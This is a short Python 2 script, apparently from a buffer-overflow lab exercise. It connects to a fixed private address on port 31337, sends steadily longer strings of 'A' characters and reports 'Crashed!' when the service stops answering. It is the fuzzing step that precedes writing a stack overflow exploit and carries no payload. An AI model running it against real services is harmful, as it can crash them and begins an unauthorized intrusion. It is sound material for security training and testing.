#!/usr/bin/env python2
import socket

RHOST="192.168.205.170"
RPORT=31337

def connect(i, x):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((RHOST, RPORT))

  buf = ""
  buf += "A"*x*i
  buf += "\n"

  s.send(buf)

  print "Sent: {0} A's".format(x*i)

  resp = s.recv(1024)

  if resp:
    print "Received: {0}".format(resp)
  else:
    print "Crashed!"

def main():
  for i in range(100):
    connect(i, 10)

main()
